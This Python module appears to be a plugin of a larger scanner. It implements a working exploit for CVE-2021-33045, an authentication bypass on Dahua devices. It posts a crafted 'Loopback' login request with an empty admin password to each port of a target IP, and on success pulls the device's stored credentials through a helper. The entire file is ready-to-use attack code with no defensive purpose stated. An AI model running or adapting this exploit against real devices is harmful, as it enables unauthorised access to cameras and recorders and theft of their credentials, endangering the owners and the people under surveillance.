"""CVE-2021-33045 — Dahua Loopback bypass → extract credentials."""
import requests

from .base import DEFAULT_PORTS, http_extract_credentials, USER_AGENT

NAME = "CVE-2021-33045"
PORTS = DEFAULT_PORTS
TIMEOUT = 10

HEADERS = {
    'User-Agent': USER_AGENT,
    'Host': '',
    'Origin': '',
    'Referer': '',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Connection': 'close',
    'X-Requested-With': 'XMLHttpRequest',
}

BYPASS_JSON = {
    "method": "global.login",
    "params": {
        "userName": "admin",
        "password": "",
        "clientType": "Dahua3.0-Web3.0-NOTUSED",
        "loginType": "Loopback",
        "authorityType": "Default",
        "passwordType": "Default",
    },
    "id": 1,
    "session": 0,
}


def check(ip, timeout=TIMEOUT):
    """Returns (user, password, name) or (None, None, None)."""
    for port in PORTS:
        try:
            headers = {
                'User-Agent': USER_AGENT,
                'Host': ip,
                'Origin': f'http://{ip}',
                'Referer': f'http://{ip}',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Connection': 'close',
                'X-Requested-With': 'XMLHttpRequest',
            }
            url = f"http://{ip}:{port}/RPC2_Login"
            r = requests.post(url, headers=headers, json=BYPASS_JSON,
                              verify=False, timeout=timeout)
            if r.status_code != 200:
                continue
            data = r.json()
            if data.get('result') is not True:
                continue

            user, password = http_extract_credentials(ip, port, timeout=timeout)
            if password:
                return user, password, NAME
        except Exception:
            pass
    return None, None, None
